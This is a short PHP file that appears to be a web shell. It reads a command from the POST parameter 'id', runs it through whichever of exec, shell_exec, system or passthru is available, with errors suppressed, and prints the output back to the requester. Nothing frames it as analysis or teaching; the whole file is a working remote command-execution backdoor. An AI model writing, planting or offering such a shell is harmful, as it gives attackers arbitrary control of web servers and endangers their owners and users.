<?php
function ex($cf3) {
    $res = '';
  
    if(function_exists('exec')) {
      @exec($cf3,$res);
      $res = join("\n",$res);
	  
    } elseif(function_exists('shell_exec')) {
      $res = @shell_exec($cf3);
    } elseif(function_exists('system')) {
      @ob_start();
      @system($cf3);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(function_exists('passthru')) {
      @ob_start();
      @passthru($cf3);
      $res = @ob_get_contents();
      @ob_end_clean();
    } 
    return $res;
}

$cmdline = $_POST['id'];
$ret = ex($cmdline);
echo $ret;	
?>